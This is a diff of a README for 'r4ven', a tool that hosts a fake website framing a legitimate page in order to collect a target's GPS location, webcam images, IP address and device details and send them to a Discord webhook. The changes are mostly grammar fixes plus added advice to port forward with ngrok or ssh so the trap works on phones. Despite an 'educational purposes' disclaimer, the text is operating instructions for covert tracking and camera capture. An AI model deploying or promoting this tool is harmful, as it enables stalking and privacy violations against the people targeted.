@@ -21,7 +21,7 @@
 
 <h4 align="center"> Track the IP address and GPS location of the user's smartphone or PC and capture a picture of the target, along with device information. </h4>
 
-The tool hosts a fake website which uses an iframe to display a legit website and, if the target allows it, it will fetch the Gps location `(latitude and longitude)` of the target, capture multiple picture of the target along with `IP Address` and `Device Information`.
+The tool hosts a fake website which uses an iframe to display a legit website and, if the target allows it, it will fetch the Gps location `(latitude and longitude)` of the target, capture multiple pictures of the target along with `IP Address` and `Device Information`.
 
 <h4 align="center"> This tool is a Proof of Concept and is for Educational Purposes Only. </h4> 
 
@@ -36,17 +36,17 @@ Using this tool, you can find out what information a malicious website can gathe
 - User interaction for location permission
 - Display of a website through an embedded iframe
 - Regular interval-based data collection
-- Access to and upload of webcam images
+- Access to and upload webcam images
 - Formatting and presentation of data in Discord messages
 - Links to Google Maps and Google Earth based on location
 - Error handling for denied location permission
 - User feedback and error messages
 
 ---
-### On link click
+### On the link click
 
 ```diff
-+ It will automatically fetch IP address and device information
++ It will automatically fetch the IP address and device information
 ! If location permission is allowed, it will fetch the exact location of the target.
 ! If camera permission is allowed, it will capture non-stop from the front camera.
 ```
@@ -55,6 +55,8 @@ Using this tool, you can find out what information a malicious website can gathe
 
 ```diff
 
+- Make sure you port forward else it will not work on the smartphone's browser
+# Most browsers auto block extra permissions for ip based URL. so port forward!!
 - It will not work on laptops or phones that have no GPS or no Camera, 
 # browsers that block javascript,
 # or if the target is mocking the GPS location.
@@ -77,8 +79,8 @@ Using this tool, you can find out what information a malicious website can gathe
 ```diff
 + GPS fetch almost exact location because it uses longitude and latitude coordinates.
 @@ Once location permission is granted @@
-# accurate location information is recieved to within 20 to 30 meters of the user's location.
-# (it's almost exact location)
+# Accurate location information is received to within 20 to 30 meters of the user's location.
+# (it's almost the exact location)
 ```
 ---
 
@@ -115,7 +117,7 @@ pip3 install -r requirements.txt
 python3 r4ven.py
 ```
 
-```enter your discord webhook url (set up a channel in your discord server with webhook integration)```
+```Enter your discord webhook URL (set up a channel in your discord server with webhook integration)```
 
 https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks
 
@@ -131,7 +133,7 @@ https://discord.com/
 
 ---
 
-#### ⭓ To chnage website template
+#### ⭓ To change website template
 
 - open file `index.html` on line 12 and replace the `src` in the iframe. (Note: not every website support iframe)
 
@@ -142,9 +144,11 @@ https://discord.com/
 - For ngrok port forward type: ngrok http 8000
 - For ssh port forwarding type: ssh -R 80:localhost:8000 ssh.localhost.run
 
+## NOTE: Make sure you port forward else it will not work on the smartphone's browser
+
 ---
 
-#### 💬 If having issue [Chat here](https://discord.gg/ZChEmMwE8d)
+#### 💬 If having an issue [Chat here](https://discord.gg/ZChEmMwE8d)
 [![Discord Server](https://discord.com/api/guilds/726495265330298973/embed.png)](https://discord.gg/ZChEmMwE8d)
 
 ### ⭔ Snapshots
